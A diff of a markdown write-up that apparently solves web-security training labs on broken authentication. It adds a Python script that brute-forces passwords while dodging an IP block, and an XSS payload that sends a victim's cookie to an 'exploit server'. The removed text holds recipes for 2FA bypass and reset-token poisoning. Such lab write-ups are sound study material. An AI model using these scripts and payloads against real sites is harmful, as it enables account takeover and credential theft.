@@ -4,158 +4,117 @@
 
 </div>
 
-## **SQL injection in different contexts**
+### **Lab:** Broken brute-force protection, IP block
 
-### **Lab 1:** Username enumeration via different responses
+**Goal:** Login as user carlos
 
-**Solution:** We rely on the respond of the request when we enter the username ('Invalid username' when we enter wrong username, 'Invalid password' when we enter valid username) to enumerate the username. When we get the username, use the wordlist to get the right password. 
+**The lab provide:** A credential wiener:peter, a password wordlist [password](./passwordlist.txt)
 
-**Solution script:** [passLab1.py](./passLab1.py)
+**Solution:** 
 
-### **Lab 2:** Username enumeration via subtly different responses
+1.  We see that when we login incorrectly 3 times in a row, our IP address is temporarily blocked. However, we can bypass this restriction by login 2 times then login correctly with credential wiener:peter.
 
-**Solution:** We rely on the respond of the request when we enter the username ('Invalid username or password.' when we enter wrong username, 'Invalid username or password ' when we enter valid username) to enumerate the username. When we get the username, use the wordlist to get the right password. Solution script: [passLab2.py](./passLab2.py)
+![](./img/Lab1/1.png)
 
-### **Lab 3:** Username enumeration via response timing
+2.  I use this [python script](./passLab4.py) to brute force for the password and solve the lab
 
-**Solution:** Use X-Forwarded-For header to bypass IP-brute-force protection. Notice that when we enter valid username, nothing happened. However, when we enter invalid username, the respond time is very long if we enter a very long password. Therefore, we can ultilize that fact to enumerate the username and then use the wordlist to get the password. 
+The check_login function will login with username and password. It returns true if the login is successful with username is not weiner
 
-**Solution script:** [passLab3.py](./passLab3.py)
+```python
+def check_login(session, domain, username, password):
+    credential = {'username': username, 'password': password}
+    r = session.post(domain + '/login', data=credential)
+    if (username != 'wiener'):
+        print('Trying Password: ', password)
+    if ('Incorrect password' not in r.text and username != 'wiener'):
+        return True
+    else:
+        return False
+```
 
-### **Lab 4:** Broken brute-force protection, IP block
+The brute function will login two times with password in the wordlist and then login with credential wiener:peter. If the password is right, the function will print that password 
 
-**Solution:** We see that if we loggin incorrectly 3 times in a row, the IP address is temporarily blocked. Therefore, we will login 2 times and then login with right credential (wiener:peter). Repeat this process until we get the right password. 
+```python
+def brute(session, domain, username, wordlist):
+    with open(wordlist, 'r') as f:
+        count = 0
+        for password in f.readlines():
+            password = password.strip()
+            count += 1
+            if (count % 3 != 0):
+                if (check_login(session, domain, username, password)):
+                    print('Found Password: ', password)
+                    break
+            else:
+                count = 1
+                check_login(session, domain, 'wiener', 'peter')
+                if (check_login(session, domain, username, password)):
+                    print('Found Password: ', password)
+                    break
+```
+
+The verify function will verify whether the lab is solved is not
+
+```python
+def verify(session, domain):
+    r = session.get(domain)
+    if ('Solved' in r.text):
+        print('Solved. Visit ' + domain + ' to see the solution.')
+    else:
+        print('Not solved yet.')
+```
+
+![](./img/Lab1/1.png)
+
+![](./img/Lab1/2.png)
 
 **Solution script:** [passLab4.py](./passLab4.py)
 
-### **Lab 5:** Username enumeration via account lock
+### **Lab:** Offline password cracking
 
-**Solution:** We see that if we loggin incorrectly with right account 5 times in a row, the account is temporarily blocked. Therefore, if we login as an invalid username, nothing is blockes. We can ultilize that fact to enumerate the username. When we get the username, use wordlist to find password. If the respond does not contain any error message, the password is right. 
+**Goal:** Login as user carlos
 
-**Solution script:** [passLab5.py](./passLab5.py)
+**The lab provide:** A credential wiener:peter, a password wordlist [password](./passwordlist.txt)
 
-### **Lab 6:** Broken brute-force protection, multiple credentials per request
-
-**Solution:** In the post request to /login endpoint, change to request body to:
-```javascript
-{
-    'username': 'carlos',
-    'password': [
-        (list of password)
-    ]
-}
-```
-
-**Solution script:** [passLab6.py](./passLab6.py)
-
-## **Vulnerabilities in multi-factor authentication**
-
-### **Lab 7:** 2FA simple bypass
-
-**Solution:** Login as credential carlos:montoya and then change the endpoint to /my-account to access to the Carlos's account page
-
-**Solution script:** [multiLab1.py](./multiLab1.py)
-
-### **Lab 8:** 2FA broken logic
-
-**Solution:** Send a GET request to the /login2 endpoint with cookies:
-```javascript
-{'verify': 'carlos'}
-```
-Then brute force for the mfa-code in the POST request to the /login2 endpoint with that same cookies. (mfa-code is between 0000 and 9999)
-
-**Solution script:** [multiLab2.py](./multiLab2.py)
-
-### **Lab 9:** 2FA bypass using a brute-force attack
-
-**Solution:** We see that when enter the wrong code for second authentication twice, we will be logged out. Therefore, we will brute force for the code by attemp one time then login again. Repeat this process until we find the right code
-
-**Solution script:** [multiLab3.py](./multiLab3.py)
-
-## **Vulnerabilities in other authentication mechanisms**
-
-### **Lab 10:** Brute-forcing a stay-logged-in cookie
-
-**Solution:** For each password in the wordlist, caculate md5 hash of the password, we will call it md5(password). Then make a cookie:
-```javascript
-{'stay-logged-in': base64(carlos:md5(password))}
-```
-base64(string) is the base64 encoded of a string.
-
-**Solution script:** [otherLab1.py](./otherLab1.py)
-
-### **Lab 11:** Offline password cracking
-
-**Solution:** The format of the cookie is the same as the one from Lab 10. We see that this website is vulnerable to XSS in the comment section
+**Solution:** 
+1.    We see that this website is vulnerable to XSS in the comment section when we comment as ``<b>XSS</b>``
 
 ![XSS](./img/otherLab2.png)
 
-Therefore, we use this payload to steal carlos's cookie
+2.  Moreover, when we login as wiener:peter, we get a stay-logged-in cookie which value is base64 encoded. 
+
+![](./img/Lab2/1.png)
+
+![](./img/Lab2/2.png)
+
+The cookie is constructed as: username + ':' + md5 hash of password
+
+![](./img/Lab2/3.png)
+
+3.  With the XSS vulnerbility we discovered before, we use this payload to steal carlos's cookie. When carlos login and visit the comment section, he will send the GET request to the server which contain his stay-logged-in cookie. The access log will record it in the server so we can read his cookie
 
 ```javascript
-<script>document.location="{}/"+document.cookie</script>.format(exploit_server)
+<script>document.location="your exploit server"+document.cookie</script>
 ```
 
-When we go to the access log of the exploit server, we see a request came from carlos containing his cookie
+![](./img/Lab2/4.png)
 
-![Cookie](./img/otherLab2-1.png)
+4.  When we go to the access log of the exploit server, we see a request came from carlos containing his cookie
 
-Decode the cookie using Base64, we get:
+![](./img/Lab2/5.png)
+
+5.  Decode the cookie using Base64, we get:
+
 ```
 carlos:26323c16d5f4dabff3bb136f2460a943
 ```
 
-Using [Crack Station](https://crackstation.net/), we get the password `onceuponatime`
+6.  Using [Crack Station](https://crackstation.net/), we get the password `onceuponatime`
 
 ![Hash](./img/otherLab2-2.png) 
 
+7.  Login as carlos and delete his account to solve to the lab
+
+![](./img/Lab2/6.png)
+
 **Solution script:** [otherLab2.py](./otherLab2.py)
-
-### **Lab 12:** Password reset broken logic
-
-**Solution:** Make a POST request to endpoint '/forgot-password?temp-forgot-password-token=' with the request body 
-```javascript
-{
-    'temp-forgot-password-token': '', 
-    'username' : 'carlos', 
-    'new-password-1': '123456', 
-    'new-password-2': '123456'
-}
-```
-
-This will change password of user carlos to 123456. Then login as user carlos with password 123456 to solve the lab
-
-**Solution script:** [otherLab3.py](./otherLab3.py)
-
-### **Lab 13:** Password reset poisoning via middleware
-
-**Solution:** Make a POST request to the endpoint '/forgot-password' with header 
-```
-X-Forwarded-Host: (your exploit server)
-```
-and request body
-```javascript
-{'username': 'carlos'}
-```
-This will create the URL containing the exploit server's domain and carlos's reset token which will sent to carlos's email. When he click that URL, the request will be recorded in the access log.
-
-![Log](./img/otherLab4.png)
-
-When you have a token, go to endpoint '/forgot-password?temp-forgot-password-token=(carlos's token) to reset carlos's password
-
-### **Lab 14:** Password brute-force via password change
-
-**Solution:** Firstly, login as wiener. Then, use brute force with the wordlist to make a POST request to endpoint '/my-account/change-password' with the request body:
-```javascript
-{
-    'username': 'carlos', 
-    'current-password': password in the wordlist, 
-    'new-password-1': '1', 
-    'new-password-2': '2'
-}
-```
-Note that the new-password-1 and new-password-2 has to be different
-
-If the respond contain message 'New passwords do not match', that mean this is a password of the user carlos.
-
-**Solution script:** [passResetLab.py](./passResetLab.py)
